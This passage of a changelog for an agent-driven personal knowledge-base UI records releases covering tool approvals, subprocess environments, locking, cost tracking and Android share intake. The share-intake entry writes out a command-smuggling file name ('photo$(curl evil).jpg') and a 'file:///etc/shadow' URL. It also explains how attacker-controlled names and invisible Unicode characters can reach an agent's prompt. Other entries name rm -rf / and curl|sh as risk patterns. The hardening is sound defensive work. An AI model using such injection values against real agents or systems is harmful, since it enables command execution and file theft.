- 5b7fb32: Restrict repo-owned subprocess environments by audience, preserve first-party CLI and module capability settings, and add an operator allowlist escape hatch. Pi extensions (`pi.exec()` through `execCommand()`) and pi's package-manager helpers still inherit the full server environment because pi 0.84.4 exposes no supported environment option; 0.35.0 moves the pi runtime under the `agent` uid to close that in-SDK residual.

## 0.33.0

### Minor Changes

- 07d63eb: Add the injected service-worker policy and shared hash-routing and update-safe reload hooks.

### Patch Changes

- 95a180c: Guard protocol schemas with exact type-level parity checks and align existing server-frame validators.

## 0.32.0

### Minor Changes

- ec340d2: Add the experimental audience-tagged subprocess environment descriptor and strip server-only credentials from brain CLI and agent subprocesses while retaining agent authentication, git credentials, and unknown operator variables.

## 0.31.0

## 0.30.1

## 0.30.0

### Minor Changes

- eac9b98: feat: web search providers are toggles, and the agent knows which are live

  Settings → Models → Web search replaces its single provider dropdown with
  per-provider toggles (Exa, DuckDuckGo, Brave, Jina, Perplexity, Tavily,
  OpenAI, Gemini, Firecrawl, Kagi), each with its own API-key field, cost note
  and description.

  Enabled providers are written to `web-search.json` as an ordered
  `searchRouting.providers` chain sorted cheapest-first, with every failure kind
  in `fallbackOn`. An ordinary search is answered by a free provider; a paid one
  like Perplexity is only reached when the cheap ones fail, or when the agent
  asks for it by name.

  The pi backend's system prompt now names the providers that are actually
  reachable. This matters because `pi-web-access` hard-codes ~28 provider names
  into its own tool description regardless of configuration — a model reading
  only that will ask for a provider with no key and get an error. The brief also
  carries the cost gradient, so the agent knows to leave `provider` off unless a
  question warrants a specific one.

  Two hazards are now handled explicitly:

  - A `provider`/`searchProvider` key in `web-search.json` overrides
    `searchRouting` entirely, and pi's own `/curator` command writes one back.
    Writes here delete both keys, and the settings UI reports a stray one as an
    override rather than showing a chain that is not running.
  - A provider with no credential is skipped at search time, so enabling one is
    refused up front. Credentials are detected from the config file _or_ the
    environment, so a key supplied as `PERPLEXITY_API_KEY` counts.

  The provider catalog, path resolution and override rules now live in
  `@schlessera/brain-ui-sdk/server` (`WEB_SEARCH_PROVIDERS`, `webSearchBrief`,
  `resolveWebSearchConfigPath`), replacing three hand-maintained copies.

## 0.29.0

## 0.28.1

## 0.28.0

### Minor Changes

- d4fcf65: "Always allow" per tool.

  - Approval cards gain an **Always allow** button: the host remembers the
    tool (server `settings` table) and answers its future requests without a
    card — for both backends and any extension/MCP tool, since the grant is
    applied host-side in the ws bridge before a card is ever emitted.
  - Permission requests now carry a `kind`: `"tool"` (grantable) vs
    `"command"` (a destructive-bash confirm-pattern confirmation). Kind
    "command" can neither be remembered nor auto-answered — the client hides
    the button and the host refuses a tampered `always` flag — so the
    destructive-command seatbelt stays per-use.
  - Settings → Models gains an **Always-allowed tools** list with per-tool
    revoke (`GET/DELETE /api/tool-permissions`).
  - Wire protocol: additive `always?: boolean` on `tool_approval`, additive
    `kind?` on `tool_approval_request` (re-delivered cards included).

## 0.27.0

### Minor Changes

- afbe784: pi backend parallelism.

  - **Keyed locks replace the pi backend's global write mutex**: file writes
    lock per path, brain document tools share one key, and bash locks the
    repo-git key only for git-staging/history and brain-CLI write commands
    (`bashLockKey`, shared with the Claude backend via ui-sdk). Builds, greps
    and other read-shaped bash run lock-free, so pi's parallel sibling tool
    calls and parallel sessions actually execute in parallel. Injecting the
    legacy `writeLock` option restores whole-lock serialization.
  - **`subagent` fan-out**: the `pi-subagents` extension's tool joins the
    default allowlist (parity with Claude's auto-allowed Agent tool), and the
    system-prompt brief names it when the package is installed.
  - **Backend-honest execution brief**: `buildSystemPromptAppend` gains an
    `execution` option (subagent tool name, per-turn-process semantics,
    parallel tool calls). The Claude backend's text is unchanged; pi's brief
    now tells the model to batch independent tool calls (they run
    concurrently) and no longer references subagents it doesn't have.

## 0.26.0

### Minor Changes

- 8b41fc3: pi backend parity with the Claude backend.

  - **Approvals**: mutations no longer each raise a card. A single `tool_call`
    permission gate (inline extension, fires before every tool — curated and
    extension-registered) implements the Claude posture: allowlisted tools run
    free, destructive bash shapes confirm (shared
    `DEFAULT_CONFIRM_BASH_PATTERNS`, moved to `brain-ui-sdk/server`),
    non-allowlisted tools ask. `brain_archive` keeps its card.
  - **Context**: both `AGENTS.md` AND `CLAUDE.md` load when the brain repo has
    both (pi previously took AGENTS.md alone — the Claude backend reads
    CLAUDE.md, so the two backends saw different instructions). The
    system-prompt append is now built per session from the opening turn's
    client environment and turn budget, like the Claude backend's per-turn
    brief.
  - **Tools**: curated surface extended to the full brain MCP set
    (`brain_read`, `brain_list`, `brain_graph`, `brain_update`,
    `brain_archive`) plus bridge-backed `get_current_location` (reverse
    geocoding shared via `brain-ui-sdk/server`), `query_activity`, and
    `request_image_mask`, each registered per host capability.
  - **Extensions**: `loadExtensions` now defaults to true — the gate covers
    extension tools. Recommended: `pi-web-access` (web search/fetch,
    auto-allowed like Claude's WebSearch/WebFetch) and `pi-mcp-adapter` (MCP
    servers from `.mcp.json`, prompted like non-allowlisted MCP tools).
  - **rtk**: when the `rtk` binary is on PATH, both backends route bash
    commands through rtk's rewrite oracle (`git status` → `rtk git status`,
    60-90% less output for the model to read). Applied after gating, so
    confirm patterns see the original command; absent rtk changes nothing.
  - **Upstream bump**: pi SDK 0.80.10 → 0.84.4 (`pi-coding-agent`,
    `pi-agent-core`, `pi-ai`). Verified: event mapping already delta-based
    (0.84's `message_update` change), auth already on the `ModelRuntime` API,
    extension install + load re-tested on 0.84.4.
  - **Web search settings**: new Settings → Models → "Web search" card (pi
    deployments only). Provider select defaults to Auto — Exa's free keyless
    tier — with per-provider API keys (Exa, OpenAI, Brave, Tavily, Perplexity,
    Firecrawl, Jina, Kagi, Gemini) stored server-side in the pi config dir's
    `web-search.json`, the file pi-web-access reads. Key values never travel to
    the client; hand-edited config fields beside the managed ones survive; a
    save clears pi's extension cache so new conversations pick the change up.

## 0.25.0

### Minor Changes

- 02552ed: Per-model reasoning effort, editable in Settings → Models.

  - Effort-capable rows (the pi backend's profiles — Claude rows have no effort
    knob) get a tri-state effort select next to billing: "Default (<level>)"
    shows the configured level, an explicit pick is stored server-side
    (`PUT /api/models/thinking`, full record like hidden/billing) and applies
    to the NEXT new session — no env edit, no redeploy. Resumed sessions stay
    pinned.
  - `ProviderInfo.thinkingLevel` (additive) carries the effective level, and
    its presence marks a profile as effort-capable; `ModelCatalogEntry` gains
    `thinkingOverride`. `ThinkingLevel`/`THINKING_LEVELS`/`isThinkingLevel`
    join the sdk protocol.
  - `CreatePiBackendOptions.profiles` also accepts a function, re-read on every
    roster listing and model resolution, which is how the host applies settings
    overrides live.

## 0.24.0

### Minor Changes

- 88c03d9: Configurable default model, user-managed OpenRouter models, auto-collapsing
  thinking.

  - **Default model** (Settings → Models): the profile used when a turn names
    none — a fresh device's first conversation, a share filed into the brain,
    host-initiated actions. Stored server-side; "Auto" prefers a CONNECTED
    subscription account (pi's `openai-codex` — probed via the new
    `hasStoredCredential()` export, a cheap read of pi's auth store) and falls
    back to the built-in default. The resolved default also leads
    `/api/providers`, so a fresh picker lands on it.
  - **OpenRouter models** (Settings → Models): add or remove models by id
    (e.g. `z.ai/glm-5.3-flash`) with no env edit or redeploy. Stored ids join
    the Claude roster as declared OpenRouter profiles (api-billed via
    `OPENROUTER_API_KEY`); removing the model behind the stored default resets
    the default to auto.
  - **Thinking sections auto-collapse** when their streaming completes,
    leaving the "Thought for ~N tokens" affordance to reopen them.

## 0.23.0

## 0.22.0

### Minor Changes

- d4261bb: Complete the per-backend tool-call rendering abstraction.

  The renderer registry was already backend-scoped, but the timeline hardcoded
  `backend: "claude"`, three code paths bypassed the registry (header label,
  touched-file summary, subagent-row gating), and risk advisories keyed on
  Claude tool names — so pi tool calls fell to the generic tier and risky pi
  `bash`/`write_file` inputs raised no approval-card advisories.

  - `session_info` now carries `backendId` (rev 3, additive); backends stamp
    their own, the host stamps stored sessions on resume/reattach. The client
    records it per session and scopes renderer resolution with it.
  - `ToolRenderer` grows `label`, `touchedFile`, `subagentRows`, and a
    backend-neutral `semantics` contract (`command`/`writePath`/`unsandboxed`);
    the timeline consumes only the renderer, no more name switches.
  - Risk rules now test semantics instead of Claude tool names, with a
    shape-sniffing fallback for renderers that declare none — the same rm -rf /
    force-push / curl|sh / writes-outside-repo advisories fire for every
    backend.
  - New pi renderer pack: `bash`, `read_file`, `write_file`, `edit_file`,
    `grep`, `brain_search`, `brain_context`, `brain_add` render with the same
    dedicated views (diff, file write, command, grep rows) as the Claude pack;
    pi's bare `ask_user` is recognized by the ask-user card grouping.

## 0.21.0

## 0.20.0

### Minor Changes

- d97dbd0: Cost tracking: dynamic pricing and effective spend, plus activity-detail quality-of-life.

  - **Dynamic model pricing** (ui-server): a TTL-cached pricing service merging
    LiteLLM's community price table with OpenRouter's live catalog, cached at
    `$BRAIN_PATH/.brain-ui/model-pricing.json` with a bundled offline snapshot;
    `BRAIN_UI_PRICING_DISCOVERY` / `BRAIN_UI_PRICING_TTL_HOURS` control it.
  - **Effective cost** (ui-server, migration 010): every run's rollup gains
    `effective_cost_usd` + `billing_mode` + `pricing_estimate`, computed inside
    the rollup transaction and frozen at first computation. Subscription-billed
    runs (ambient OAuth) are $0 out of pocket; API-key/OpenRouter runs are
    priced from per-model token usage. Unknown stays NULL — never $0.
  - **Billing classification** (ui-server): resolved per inference profile at
    run start (declared-credential profiles → api; ambient → subscription iff
    the OAuth token is the credential), overridable per profile from
    Settings → Models (`PUT /api/models/billing`).
  - **Dual-cost surfaces**: Activity spend cards, day/job/session rollups, the
    daily digest, and `query_activity` all carry effective cost plus an
    explicit unpriced-run count ("≥ $X · N unpriced"); run rows render
    three-state cost (unknown / free / priced, "~" for estimates); a staleness
    indicator appears when pricing refresh is failing (`GET /api/models/pricing`).
  - **Detail retention window** (ui-server): span trees survive at least
    `activity.retention.detailDays` (default 7) instead of dying at the next
    morning digest — nightly cron runs stay drillable.
  - **Tool I/O capture**: tool calls record clipped input/output payloads as
    span events, expandable in the Activity drill-in (subagent view and run
    detail); pre-capture runs state that no payload was recorded.

### Patch Changes

- 00565d5: Activity-layer review follow-ups (the items deferred from the 0.19.0 review):

  - **Watchdog** (ui-server): a per-job stuck-threshold override below the
    default now actually fires — the scan uses the smallest effective
    threshold, the per-span check still applies each job's own.
  - **Push retry** (ui-server): `send_failed` intents are retried with a
    3-attempt budget and 5-minute backoff (migration 009 adds
    `send_attempts`) — a transient push-service failure no longer forfeits
    push delivery for that notification.
  - **Restart notification** (ui-server): turns interrupted by a server
    restart now produce a failure intent — the boot orphan sweep runs after
    the notifier exists, so its terminal writes are seen by the first tick.
  - **Digest** (ui-server): generation is one immediate transaction and the
    covered-until write is monotonic — a manual run racing the cron job can
    no longer double-count a window or regress the retention floor.
  - **Prune index** (ui-server): migration 009 adds the partial index the
    hourly prune's candidate query needed and drops the unused
    `idx_activity_spans_session`.
  - **PushToggle** (ui-react): now performs the server-disagreement check —
    a subscription bound to a stale VAPID key is dropped (surfacing the
    re-enable button) and a server-side pruned row is healed by re-asserting
    the subscription.
  - **Span naming** (ui-sdk): the `execute_tool <name>`/`invoke_agent`
    convention is now exported protocol constants
    (`SPAN_OP_EXECUTE_TOOL`, `SPAN_OP_INVOKE_AGENT`, `SPAN_TOOL_NAME_PREFIX`)
    instead of three independent restatements.
  - **pi usage** (backend-pi): the turn-usage accumulator narrows the SDK's
    typed `message_end` variant instead of a hand-rolled double cast.

## 0.19.0

### Minor Changes

- b15b5f0: Agent observability: a full activity layer across the stack.

  - **Activity record** (ui-server): an OTel-GenAI-aligned span store in the
    server SQLite records every turn, tool call, subagent run and cron run as
    a tree — written at start, closed write-once with a six-outcome taxonomy
    (`denied` and `interrupted` are first-class), with boot/staleness sweepers
    (heartbeat-keyed), a stuck-run watchdog, per-run rollups that survive
    pruning forever, and a digest-floor + hard-ceiling retention policy.
  - **Wire protocol** (ui-sdk, rev 3 additive): view-scoped
    `activity_subscribe`/`activity_snapshot`/`activity_delta` frames with a
    seq-discard ordering contract, a `usage` block (per-model token/cost
    breakdown) on `result`, and subagent linkage (`parentToolUseId`) on tool
    frames. `server_hello` advertises `capabilities.activity`.
  - **Backends**: the Claude adapter stops flattening subagent activity
    (task lifecycle, per-subagent usage, forwarded transcripts to the new
    bridge side channel; `forwardSubagentText` on; SDK floor 0.3.241) and
    reports full `modelUsage`; the pi backend reports per-turn token usage
    from its event stream. The new read-only `mcp__brain-ui__query_activity`
    tool lets the agent answer "what ran / what is running?" from the record.
  - **UI** (ui-react): live subagent rows with a stacked drill-in view
    (observation-shaped; approvals actionable there and in the chat), one
    server clock for live and reloaded duration badges, and a first-class
    Activity surface — live runs, history, rollup cards, failure inbox with
    nav badges, a while-you-were-away digest card, and a three-state web-push
    toggle. Activity takes the mobile tab-bar slot; Graph moves to More.
  - **Notifications** (ui-server): persisted intents (at-least-once, storm-
    capped, watched-suppressed) with an in-app inbox as the guaranteed tier
    and web push (generated VAPID keys in a secret-classified table,
    per-device subscriptions, minimized payloads, 404/410 pruning) on top.
  - `getCronStatus` now lists every recorded job name, closing the gap that
    hid module jobs from `/api/status`; the sessions listing merges stored
    cost accounting over backend zeros.

## 0.18.0

### Minor Changes

- a29b287: Harden the agent turn lifecycle against the failure modes found in the
  2026-08-23 fan-out incident (23 background subagents killed, tool aborts
  misread as user denials, one long Bash freezing every session's writes).

  - **Configurable turn timeout.** `BRAIN_UI_TURN_TIMEOUT_MS` now feeds
    `createApp()` (explicit option still wins); the host passes the live budget
    to backends as `StartTurnRequest.turnBudgetMs`, and the Claude backend puts
    the real number in the system prompt so the model sizes work to the cap.
  - **Keyed write locks replace the global mutex** (`createKeyedLock` in
    brain-ui-sdk; the old `createWriteLock` remains for the pi backend). The
    Claude backend now serializes per target file for Write/Edit/NotebookEdit,
    repo-wide only for git staging/history commands (and `brain sync|import`),
    and on one shared key for the brain document tools. Everything else — curl,
    builds, tests — takes no lock. Lock waits are bounded (`lockWaitMs`,
    default 30s, under the CLI's 60s hook timeout) and expire into a DENY with
    an explicit "retry" reason instead of stalling into the CLI's misleading
    "hook did not respond" refusal.
  - **Agent calls are rewritten to run in the foreground.** The SDK's Agent
    tool backgrounds subagents BY DEFAULT, and a background subagent dies with
    the per-turn subprocess. A PreToolUse hook rewrites
    `run_in_background` to `false` (and denies `isolation: "remote"`, whose
    results nothing could collect), telling the model why via
    `additionalContext`.
  - **Turn-lifecycle brief in the system prompt append**: per-turn subprocess
    semantics, the hard budget, incremental-write guidance, and how to read
    "the user doesn't want to take this action" / lock-busy errors (usually a
    cancelled turn or contention, not a human refusal).
  - **Approvals and ask-user cards survive disconnects.** A phone dropping its
    socket at screen lock no longer silently denies pending approvals; they are
    held (bounded by the turn timeout), re-delivered on reconnect, and an
    approval raised with no client attached logs a warning instead of parking
    invisibly. Location and mask requests keep their fail-fast behavior.

## 0.17.0

### Patch Changes

- a714ee1: Per-package `test` scripts now pass `--timeout 30000`, so `bun run test` inside a package no longer flakes on bun's 5s default when suites spawn the CLI.
- ef519d1: Harden the publish surface: what a consumer installs now matches what the
  declarations, bundler and runtime actually reach for.

  - `@schlessera/brain-backend-pi` declares `@earendil-works/pi-agent-core`
    (exact-pinned, like its sibling pi pins) instead of borrowing it from
    hoisting — its public `history.d.ts` types reference the package, so a
    strict installer (pnpm, npm with isolated modes) could not typecheck it.
  - `@schlessera/brain-ui-react` sets `sideEffects` to `["**/*.css"]` — the
    blanket `false` licensed bundlers to tree-shake a direct
    `import "@schlessera/brain-ui-react/styles.css"` away entirely.
  - `./theme.css` now resolves from `dist/` (copied verbatim at build) like
    `./styles.css` already did, so both stylesheets survive a dist-only tarball
    and the export map is uniform. The import specifier is unchanged.
  - `@schlessera/brain-module-finance`, `-images` and `-speaking` declare the
    same optional `@types/bun` peer that `-jobs` already carried: their module
    declaration graphs reach `bun:sqlite` types through `@schlessera/brain`.
  - Every package exports `"./package.json"` — tooling like Vite, Tailwind and
    Jest stats it, and the export map previously made that unreachable.
  - `engines.bun` is aligned with reality: bun-runtime packages require
    `>=1.3.5` (the CVE-2026-24910 floor `brain doctor` warns below), and
    packages that import cleanly under plain Node carry no bun engines field.
    Scrape keeps its (bumped) engines despite importing node-clean: its proxy
    fetch path shells out through `Bun.spawn`, so the runtime constraint is
    real even though the import is not.
  - Backend loading in `@schlessera/brain-ui-server` uses `await import()`
    instead of CJS `require()`, and only "the backend package itself is not
    installed" maps to the install-hint error. An installed-but-broken backend
    (missing transitive dep, syntax error, `ERR_REQUIRE_ESM`) now surfaces its
    real error instead of a misleading "not installed".

## 0.16.0

### Minor Changes

- a7362e1: Move the client half of the wire protocol into the SDK, and validate both
  directions.

  `ui-sdk` described itself as owning the protocol while its `./client` subpath
  held only two registries: the actual transport was `ui-react`'s
  `ws-client.ts`, which cast every inbound frame, and dispatch handled 15 of the
  16 server frame types inside a React hook. Any non-React consumer — a CLI, a
  mobile shell, an integration test — reimplemented reconnection, framing and
  validation from scratch.

  - **`parseServerMessage`** validates server→client frames, with one schema per
    member bound to its interface by `satisfies` so the two cannot drift. The
    receiving policy is softer than the server's on purpose: a frame that fails
    is DROPPED and reported, never thrown, because the protocol is additive and a
    client that hard-fails an unrecognised frame turns every additive server
    change into a breaking one. Unknown keys survive the boundary.
  - **`BrainUiClient`** (`@schlessera/brain-ui-sdk/client`) is the transport:
    the same backoff and `reconnectNow` as before, plus validation,
    `server_hello` capture — so `protocolRev` and capabilities are readable
    rather than advisory — and `turnId` echo on turn-scoped replies, which finally
    gives the host's echo verification something to verify. A `socketFactory`
    option makes it testable with no network.
  - **`ui-react`** keeps every store write and becomes a handler set.
    `ws-client.ts` is deleted; `handleServerMessage` and `runStateForFrame` keep
    their signatures.
  - **`error` frames are no longer dropped outside a turn.** The old handler only
    appended to a streaming transcript, so an error between turns went nowhere —
    no console, no store, no UI. `useConnectionStore` gained `lastError`, and
    protocol-level drops land there too.
  - **A real-socket integration test** drives `BrainUiClient` against a real
    `createApp()`, closing the ROADMAP item about the auth boot refusal never
    being exercised through a socket. It is also the first test that would catch
    a client/server protocol drift, since both shipped implementations are on
    opposite ends of it.

  The frame parsers no longer use Node's `Buffer` — they accept
  `string | ArrayBufferView | ArrayBuffer` and measure UTF-8 length with
  `TextEncoder`. Both parsers now run on both ends of the socket, and the client
  end is a browser bundle; the build caught this the moment `ui-react` imported
  the SDK client.

  `turnId` is still not REQUIRED — that is a protocol-rev change with a
  deprecation window, deliberately out of scope.

- 7ea32f7: Meter inbound WebSocket frames, and make `turnId` enforceable via a rev-3
  handshake.

  **Rate limiting.** Frames were size-, cardinality- and depth-bounded but not
  metered, so a flood of individually valid frames was unbounded behind the auth
  guard. Each connection now gets a token bucket — `BRAIN_UI_WS_RATE` (default 20
  frames/sec) and `BRAIN_UI_WS_BURST` (default 60), with `0` disabling it. A
  bucket rather than a fixed window because the real traffic is bursty: opening
  the app fires several frames at once and an approval storm is a dozen in a
  second, both legitimate. The bucket lives on the socket, not in a map keyed by
  something a peer controls — that map is itself the memory-exhaustion bug a rate
  limiter is supposed to prevent. Metering runs BEFORE parsing, since parsing is
  most of the work being bounded, and refusals land on the existing
  `ws.frames.dropped` counter under `reason: rate_limited`.

  **Protocol rev 3.** `turnId` could not be made mandatory because there was no
  client→server handshake: a host could not tell a current client from a
  two-year-old one, so enforcing would have broken every tool approval in older
  UIs. `client_hello` fixes that — a client declares its revision, and a host
  applies rev-3 rules only to connections that declared rev 3. Clients that send
  no hello are treated as rev 2 and keep today's tolerance indefinitely. This is
  therefore additive: no existing client changes behaviour.

  **A bug in the previous release's turnId echo is fixed here.** `BrainUiClient`
  tracked "the most recent turn id seen", which is correct with one session and
  wrong with two: a delta from session B arriving between session A's approval
  request and the user answering it made the reply carry B's id, the host refused
  the mismatch, and A's turn waited for an approval that could never be accepted
  — invisible until the ten-minute timeout. Turn ids are now tracked per request
  id and consumed when the reply goes out.

- 0fc9c44: Fix the five rough edges carried over from the extraction review.

  They were ported verbatim and never re-verified. All five were still real, and
  every one fails silently — which is why they survived: nothing errored, data
  just went missing or appeared in the wrong place.

  - **A follow-up sent mid-stream dropped every delta that followed it.**
    `mutateLastAssistant` indexed the END of the buffer, so once the user's
    second message was appended the still-streaming assistant message was no
    longer last, `role === "assistant"` failed, and each write was discarded. The
    turn kept running and its output stopped appearing. It now finds the last
    ASSISTANT message.
  - **Draft adoption could bind to another turn's session.** A client starting a
    conversation has no session id, so it adopted the first `session_info` or
    `result` for an unknown session — possibly an older background turn's, or
    another client's. `chat_message` gains an optional client-minted `draftId`,
    echoed on `session_info`, and adoption requires a match. Additive: a server
    that does not echo it falls back to the previous behaviour rather than
    leaving the draft unbound.
  - **The file store showed one file's content under another's name.** Two rapid
    clicks raced and the SLOWER fetch won. Both the success and error paths now
    drop a response for a path the user has already navigated away from.
  - **`whatsup` could deadlock.** stderr was only drained after
    `await proc.exited`, so a child that filled the pipe buffer blocked on write
    and never exited. It is drained concurrently with stdout now.
  - **The SPA fallback 404ed deep links from an absolute static root.**
    `serveStatic({ path })` resolves against the process cwd, so
    `join(staticRoot, "index.html")` only worked when `staticRoot` was itself
    cwd-relative — true of the shipped layout, not of an embedder passing an
    absolute directory. The fallback serves the file directly now.

## 0.15.0

## 0.14.0

## 0.13.1

## 0.13.0

### Minor Changes

- 2be49b8: Stage an incoming system share on the server

  First phase of making the chat UI a share target on Android: `POST /api/share`
  accepts a multipart share (title, text, url, and up to ten files) and writes it
  to `<brain root>/.brain-ui/inbox/<id>/` alongside a `meta.json` manifest, so the
  agent can read, file and process it as an ordinary chat turn. Nothing enters the
  content repo until the agent decides where it belongs.

  Everything a share carries is attacker-influenced — file names come from
  whichever app invoked the share sheet — and the consumer is an agent with file
  and shell tools, which sets the bar for "sanitized": a name is not safe merely
  because the filesystem accepts it. The staging directory's name is minted
  server-side and no part of the payload is ever treated as a path. Names go
  through an ALLOWLIST — Unicode letters, digits, marks and `._-` — rather than a
  list of characters someone thought to forbid, because `photo$(curl evil).jpg`
  survives any such list and correct quoting by the agent is not a boundary.
  Format characters go too: bidi overrides, zero-width spaces and the Unicode tag
  block, from the text fields as well as the names, since all of them are quoted
  into a prompt and all of them are invisible to the human reading it. Names are
  bounded, given an extension from their media type when they have none, and
  de-duplicated rather than overwritten;
  `meta.json` is reserved — case-insensitively, since on macOS and Windows
  `META.JSON` and `meta.json` are one file — and the length bound counts UTF-8
  bytes rather than characters, because a filesystem component limit is a byte
  limit and a hundred CJK characters are three hundred bytes.

  Caps (`SHARE_MAX_FILES`, `SHARE_MAX_FILE_BYTES`, `SHARE_MAX_TOTAL_BYTES`,
  `SHARE_MAX_TEXT_BYTES`) are counted off the request stream rather than trusted
  from `content-length`, which HTTP/2 and chunked encoding omit entirely, then
  again against each part's claimed size and once more against the decoded bytes.
  A share is staged into `.<id>.partial` and renamed into place only once
  `meta.json` is written, so the agent cannot observe a half-written share even if
  the process is killed mid-write — which `try`/`catch` cleanup cannot cover. One
  unwritable file is recorded as `skipped` rather than losing the other four.

  Two fields that reach the agent are now validated rather than passed through: a
  `url` that is not http(s) is demoted to plain text, because the filing skill
  dereferences that field and `javascript:`, `data:` and `file:///etc/shadow` all
  arrive as plausible strings; and a media type that is not a media type becomes
  `application/octet-stream` instead of being quoted back into the prompt at
  whatever length the sender chose.

  `POST /api/share` also refuses a cross-site request. Every other state-changing
  route here reads JSON, which forces a preflight and is CSRF-safe by accident; a
  multipart POST is CORS-simple and gets no preflight, and under
  `AUTH_MODE=tailscale` the credential is the source IP, so no SameSite flag
  applies either. Concurrent intakes are capped, the inbox is capped at
  `SHARE_MAX_STAGED` shares, and the prune sweep is debounced instead of running
  on every upload. A failure mid-write removes the partial directory. Staged shares older than `SHARE_STAGING_TTL_MS`
  (7 days) are pruned opportunistically on each intake, and `pruneShareStaging()`
  is exported so a deployment can also sweep at boot.

  `template/.gitignore` now ignores `.brain-ui/`, which it never did — so a
  generated brain repo would have staged a share (and the keyterm and model
  caches) into git on the next `git add -A`.

  The route is mounted behind the auth guard, which is the whole defense for
  something that writes into the brain root — a wiring test now asserts it.

  A second, public route answers `POST /share-target` when no service worker was
  there to intercept it (evicted, storage cleared, or installed before the worker
  activated) with a redirect into the app instead of a bare 404 — the SPA fallback
  is GET-only, so without it the user gets a raw error page inside the app window.
  It reads no body and must stay outside the guard: a share navigation is
  cross-site, so the SameSite=Strict cookie is absent by construction.

  The service-worker share-target handler, the client intake, and the manifest
  entry in the deployment shell follow in later phases.

- 2be49b8: Answer a system share in the service worker

  Second phase of the Android share target: `@schlessera/brain-ui-sdk/share-target`
  is a new export holding the service-worker half — `registerShareTarget()`,
  `handleShareTargetRequest()`, and an IndexedDB store that parks the payload
  until the app can upload it.

  A POST share target is a cross-site POST _navigation_, and it has to be answered
  locally rather than by a server route, for two independent reasons. The session
  cookie is `SameSite=Strict`, which is exactly the case such a navigation does not
  carry — a server route would see an unauthenticated request with the payload
  already consumed and unrecoverable. And answering locally keeps the payload on
  the device until the app is authenticated and online, so a share made offline or
  logged out is queued rather than lost. The handler therefore stashes the payload
  and redirects to the app with `?share=<id>`.

  It never rejects and never hangs: a browser mid-navigation has to land
  somewhere, so a body that will not parse (what Chrome produces when the
  manifest's `accept` lists an extension without its MIME type), an empty share, a
  share past the caps, or a store that refuses — or takes longer than five seconds
  to accept — the write each redirect with `?share_error=` for the app to explain.
  The timeout matters because `indexedDB.open()` can hang with no event at all on
  a corrupted backing store, and an unsettled response promise is a blank tab.

  The caps the server enforces are enforced here too, before anything touches the
  device: an oversized body is refused on `content-length` before `formData()`
  buffers it whole in the worker, and file count, per-file size, total size and
  text length are checked after parsing. Otherwise a share is written to the
  user's own phone first and only refused minutes later, on upload.

  `ShareStore.take()` reads and deletes in one transaction. The shell reloads
  itself when a new worker takes over and a reload keeps the query string, so
  `?share=<id>` can be read twice; the atomic claim is what stops one share being
  filed into the knowledge base twice.

  Anything reachable by the share sheet is also reachable by any website — a page
  that auto-submits a cross-site form to the action URL is indistinguishable from
  a real share, and `Sec-Fetch-Site` cannot tell them apart from inside a worker.
  A stashed share is therefore untrusted input, and the client intake that follows
  shows it on a confirmation card rather than acting on it.

  The stash is bounded: after each successful stash the handler prunes records
  older than `SHARE_STASH_TTL_MS` (24h), so a share abandoned behind a login
  prompt does not sit on the device holding whole files forever.

  No Workbox dependency — a plain `fetch` listener works with or without a router,
  and Workbox's own routes are GET-only by default, so nothing competes for the
  POST. It is a separate export subpath so a service worker can import it without
  dragging in the renderer and ASR registries that `./client` holds. Persistence
  stays concrete — the swap and in-memory implementations are named `*ForTests`
  and are not part of the package's public exports, so this is a test hook and
  not a storage seam.

  `@schlessera/brain-ui-react` gains a dev-only `ShareHarness` component: it posts
  the same multipart body to the same path from inside the page, through exactly
  the same handler, stash and redirect. Everything except the manifest
  registration itself can be verified without reinstalling the PWA — which on
  Android means waiting for a WebAPK update.

## 0.12.1

## 0.12.0

### Patch Changes

- 4281c59: Fix three things a real session on a phone turned up

  - **Images written into the brain did not display in chat.** The markdown
    renderer overrode headings, code and links but not `img`, so
    `![](assets/images/x.png)` resolved against the app origin and 404'd — the
    bytes are served by the files API. Repo-relative sources are now rewritten to
    that endpoint; `data:` URIs and absolute URLs pass through untouched.
  - **Scratch files had nowhere to go.** `brain render` and `brain image` refused
    any path outside the repo, which pushed intermediates — an HTML file that
    exists to be rendered two seconds later — into a knowledge base as git noise.
    Both now also accept paths under the system temp directory, report them
    absolute, and say that a file written there is not viewable in a UI. Anywhere
    else is still refused: this is scratch space, not free rein.
  - **The generate-pdf skill refused documents over 400 KB**, citing a file-viewer
    download limit that does not exist. The real ceiling is the file server's
    (10 MB, both the preview and raw paths); below that, size is a judgement call
    about the reader's connection. The skill no longer refuses to produce a
    document for being over an invented figure.

  Also corrects a comment on `FILE_SIZE_CAP_BYTES` claiming the `?raw=1` path was
  unbounded. It is not — `resolveForRaw` enforces the same cap, which is why
  raising it to 10 MB mattered for images and PDFs in the viewer too.

## 0.11.0

### Minor Changes

- 604abbc: Add a mask bridge: the reader paints the region an image edit applies to

  Masked inpainting needs someone to point at part of a picture, and there is no
  server-side substitute for that. This mirrors the existing location bridge: the
  agent calls `mcp__brain-ui__request_image_mask`, the browser opens a canvas over
  the image, and the painted PNG comes back over the socket.

  - **ui-sdk** — `mask_request` / `mask_response` / `mask_error` frames, validated
    at the boundary with the same decoded-byte budget as a chat image, plus
    `BackendBridge.requestMask`.
  - **ui-server** — pending-mask state on the turn coordinator, the bridge method,
    and inbound routing. Cancels reject the promise like every other pending
    interactive request, so a disconnect mid-paint fails the tool instead of
    hanging the turn.
  - **ui-react** — a `MaskEditor` modal: paint with a sized brush, undo, clear.
    Strokes are drawn on a capped working canvas and rescaled to the source
    image's true pixel dimensions on export, so a mask drawn on a phone lines up
    with a 4K original. Painted pixels export as fully transparent, which is the
    convention the edit endpoint reads.
  - **ui-backend-claude** — the tool, auto-allowed like the other bridge tools
    (the editor itself is the approval), and a system-prompt line telling the
    agent to ask rather than guess coordinates.

  The mask is written next to its image and the path returned, because what
  consumes it is `brain image --mask <path>`.

- cdfa039: Raise the preview, upload and share size limits to match the frame budget

  The socket already accepts ~12MB inbound (brain-ui sets `maxPayloadLength` to
  `MAX_CLIENT_FRAME_BYTES + 64KB`), but the limits layered above it were never
  lifted to use that headroom. Worst case today was 6MB decoded — about 8MB once
  base64 inflates it — against a 12MB frame.

  - `MAX_IMAGE_BYTES` 2MB → 4MB. This mostly governs GIFs: everything else is
    downscaled to 1568px and re-encoded to JPEG client-side, landing far below
    either number, while a GIF passes through untouched so its animation
    survives.
  - `MAX_TOTAL_IMAGE_BYTES` 6MB → 8MB, which is ~10.7MB base64 and still leaves
    the JSON envelope room inside the 12MB frame.
  - `FILE_SIZE_CAP_BYTES` 5MB → 10MB for the JSON preview path. Raw bytes
